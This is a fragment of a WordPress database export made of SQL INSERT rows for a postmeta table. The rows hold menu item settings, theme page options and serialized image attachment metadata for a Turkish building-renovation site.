INSERT INTO `cmrfu_postmeta` VALUES("1951","940","_wp_attached_file","2014/08/deprem-gercegi.png");
INSERT INTO `cmrfu_postmeta` VALUES("1950","939","_edit_lock","1412607126:1");
INSERT INTO `cmrfu_postmeta` VALUES("1949","939","er_leaf_portfolio_enable_filter","1");
INSERT INTO `cmrfu_postmeta` VALUES("1948","939","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("1947","939","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("1946","939","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("1944","939","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("1943","939","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("1942","939","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1941","939","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("1940","935","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("1939","936","_wp_attachment_metadata","a:5:{s:5:\"width\";i:600;s:6:\"height\";i:333;s:4:\"file\";s:28:\"2014/08/bina-yenileme-11.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:28:\"bina-yenileme-11-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:28:\"bina-yenileme-11-300x166.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:166;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:28:\"bina-yenileme-11-600x230.jpg\";s:5:\"width\";i:600;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:28:\"bina-yenileme-11-450x333.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:333;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:28:\"bina-yenileme-11-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:26:\"bina-yenileme-11-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1938","936","_wp_attached_file","2014/08/bina-yenileme-11.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1937","935","_edit_lock","1409341386:1");
INSERT INTO `cmrfu_postmeta` VALUES("1936","935","er_leaf_portfolio_enable_filter","1");
INSERT INTO `cmrfu_postmeta` VALUES("1935","935","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("1934","935","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("1933","935","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("1931","935","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("1930","935","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("1929","935","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1927","934","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("1928","935","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("1925","934","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1923","934","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1922","934","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1921","934","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1920","934","_menu_item_object_id","932");
INSERT INTO `cmrfu_postmeta` VALUES("1918","934","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1917","932","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("1916","932","_edit_lock","1412598651:1");
INSERT INTO `cmrfu_postmeta` VALUES("1915","932","er_leaf_portfolio_enable_filter","1");
INSERT INTO `cmrfu_postmeta` VALUES("1914","932","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("1912","932","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("1911","932","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("1910","932","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("1909","932","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("1908","932","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1050","748","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1051","748","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1052","748","_menu_item_object_id","524");
INSERT INTO `cmrfu_postmeta` VALUES("1053","748","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1054","748","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1055","748","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1056","748","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1057","748","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1058","749","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1059","749","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1060","749","_menu_item_object_id","517");
INSERT INTO `cmrfu_postmeta` VALUES("1061","749","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1062","749","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1063","749","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1064","749","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1065","749","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1066","750","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1067","750","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1068","750","_menu_item_object_id","497");
INSERT INTO `cmrfu_postmeta` VALUES("1069","750","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1070","750","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1071","750","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1072","750","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1073","750","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1074","751","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1075","751","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1076","751","_menu_item_object_id","447");
INSERT INTO `cmrfu_postmeta` VALUES("1077","751","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1078","751","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1079","751","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1080","751","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1081","751","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1905","927","_wp_attachment_metadata","a:5:{s:5:\"width\";i:960;s:6:\"height\";i:349;s:4:\"file\";s:18:\"2014/06/slide3.png\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"slide3-150x150.png\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:9:\"image/png\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"slide3-300x109.png\";s:5:\"width\";i:300;s:6:\"height\";i:109;s:9:\"mime-type\";s:9:\"image/png\";}s:4:\"post\";a:4:{s:4:\"file\";s:18:\"slide3-770x230.png\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:9:\"image/png\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:18:\"slide3-450x349.png\";s:5:\"width\";i:450;s:6:\"height\";i:349;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:18:\"slide3-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"slide3-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1904","927","_wp_attached_file","2014/06/slide3.png");
INSERT INTO `cmrfu_postmeta` VALUES("1893","454","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1894","454","er_leaf_portfolio_enable_filter","0");
INSERT INTO `cmrfu_postmeta` VALUES("1902","926","_wp_attached_file","2014/06/slide2.png");
INSERT INTO `cmrfu_postmeta` VALUES("1903","926","_wp_attachment_metadata","a:5:{s:5:\"width\";i:960;s:6:\"height\";i:350;s:4:\"file\";s:18:\"2014/06/slide2.png\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"slide2-150x150.png\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:9:\"image/png\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"slide2-300x109.png\";s:5:\"width\";i:300;s:6:\"height\";i:109;s:9:\"mime-type\";s:9:\"image/png\";}s:4:\"post\";a:4:{s:4:\"file\";s:18:\"slide2-770x230.png\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:9:\"image/png\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:18:\"slide2-450x350.png\";s:5:\"width\";i:450;s:6:\"height\";i:350;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:18:\"slide2-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"slide2-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1899","924","_format_video_embed","");
INSERT INTO `cmrfu_postmeta` VALUES("1138","759","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1139","759","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1140","759","_menu_item_object_id","524");
INSERT INTO `cmrfu_postmeta` VALUES("1141","759","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1142","759","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1143","759","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1144","759","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1145","759","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1146","760","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1147","760","_menu_item_menu_item_parent","759");
INSERT INTO `cmrfu_postmeta` VALUES("1148","760","_menu_item_object_id","550");
INSERT INTO `cmrfu_postmeta` VALUES("1149","760","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1150","760","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1151","760","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1152","760","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1153","760","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1154","761","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1155","761","_menu_item_menu_item_parent","759");
INSERT INTO `cmrfu_postmeta` VALUES("1156","761","_menu_item_object_id","567");
INSERT INTO `cmrfu_postmeta` VALUES("1157","761","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1158","761","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1159","761","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1160","761","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1161","761","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1162","762","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1163","762","_menu_item_menu_item_parent","11");
INSERT INTO `cmrfu_postmeta` VALUES("1164","762","_menu_item_object_id","394");
INSERT INTO `cmrfu_postmeta` VALUES("1165","762","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1166","762","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1167","762","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1168","762","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1169","762","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1170","763","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1171","763","_menu_item_menu_item_parent","11");
INSERT INTO `cmrfu_postmeta` VALUES("1172","763","_menu_item_object_id","417");
INSERT INTO `cmrfu_postmeta` VALUES("1173","763","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1174","763","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1175","763","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1176","763","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1177","763","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1178","764","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1179","764","_menu_item_menu_item_parent","11");
INSERT INTO `cmrfu_postmeta` VALUES("1180","764","_menu_item_object_id","440");
INSERT INTO `cmrfu_postmeta` VALUES("1181","764","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1182","764","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1183","764","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1184","764","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1185","764","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1186","765","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1187","765","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1188","765","_menu_item_object_id","198");
INSERT INTO `cmrfu_postmeta` VALUES("1189","765","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1190","765","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1191","765","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1192","765","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1193","765","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1194","766","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1195","766","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1196","766","_menu_item_object_id","206");
INSERT INTO `cmrfu_postmeta` VALUES("1197","766","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1198","766","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1199","766","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1200","766","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1201","766","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1202","767","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1203","767","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1204","767","_menu_item_object_id","234");
INSERT INTO `cmrfu_postmeta` VALUES("1205","767","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1206","767","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1207","767","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1208","767","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1209","767","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1210","768","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1211","768","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1212","768","_menu_item_object_id","215");
INSERT INTO `cmrfu_postmeta` VALUES("1213","768","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1214","768","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1215","768","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1216","768","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1217","768","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1218","769","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1219","769","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1220","769","_menu_item_object_id","240");
INSERT INTO `cmrfu_postmeta` VALUES("1221","769","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1222","769","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1223","769","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1224","769","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1225","769","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1226","770","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1227","770","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1228","770","_menu_item_object_id","305");
INSERT INTO `cmrfu_postmeta` VALUES("1229","770","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1230","770","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1231","770","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1232","770","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1233","770","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1234","771","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1235","771","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1236","771","_menu_item_object_id","269");
INSERT INTO `cmrfu_postmeta` VALUES("1237","771","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1238","771","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1239","771","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1240","771","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1241","771","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1242","772","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1243","772","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1244","772","_menu_item_object_id","389");
INSERT INTO `cmrfu_postmeta` VALUES("1245","772","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1246","772","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1247","772","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1248","772","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1249","772","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1250","773","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1251","773","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1252","773","_menu_item_object_id","323");
INSERT INTO `cmrfu_postmeta` VALUES("1253","773","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1254","773","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1255","773","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1256","773","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1257","773","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1258","774","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1259","774","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1260","774","_menu_item_object_id","315");
INSERT INTO `cmrfu_postmeta` VALUES("1261","774","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1262","774","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1263","774","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1264","774","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1265","774","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1266","775","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1267","775","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1268","775","_menu_item_object_id","283");
INSERT INTO `cmrfu_postmeta` VALUES("1269","775","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1270","775","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1271","775","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1272","775","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1273","775","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1274","776","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1275","776","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1276","776","_menu_item_object_id","341");
INSERT INTO `cmrfu_postmeta` VALUES("1277","776","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1278","776","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1279","776","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1280","776","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1281","776","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1282","777","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1283","777","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1284","777","_menu_item_object_id","332");
INSERT INTO `cmrfu_postmeta` VALUES("1285","777","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1286","777","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1287","777","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1288","777","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1289","777","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1290","778","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1291","778","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1292","778","_menu_item_object_id","362");
INSERT INTO `cmrfu_postmeta` VALUES("1293","778","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1294","778","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1295","778","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1296","778","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1297","778","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1298","779","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1299","779","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1300","779","_menu_item_object_id","292");
INSERT INTO `cmrfu_postmeta` VALUES("1301","779","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1302","779","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1303","779","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1304","779","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1305","779","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1306","780","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1307","780","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1308","780","_menu_item_object_id","300");
INSERT INTO `cmrfu_postmeta` VALUES("1309","780","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1310","780","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1311","780","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1312","780","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1313","780","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1314","781","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1315","781","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1316","781","_menu_item_object_id","297");
INSERT INTO `cmrfu_postmeta` VALUES("1317","781","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1318","781","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1319","781","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1320","781","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1321","781","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1322","782","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1323","782","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1324","782","_menu_item_object_id","248");
INSERT INTO `cmrfu_postmeta` VALUES("1325","782","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1326","782","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1327","782","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1328","782","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1329","782","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1330","783","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1331","783","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1332","783","_menu_item_object_id","256");
INSERT INTO `cmrfu_postmeta` VALUES("1333","783","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1334","783","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1335","783","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1336","783","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1337","783","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1338","784","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1339","784","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1340","784","_menu_item_object_id","264");
INSERT INTO `cmrfu_postmeta` VALUES("1341","784","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1342","784","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1343","784","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1344","784","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1345","784","_menu_item_url","");
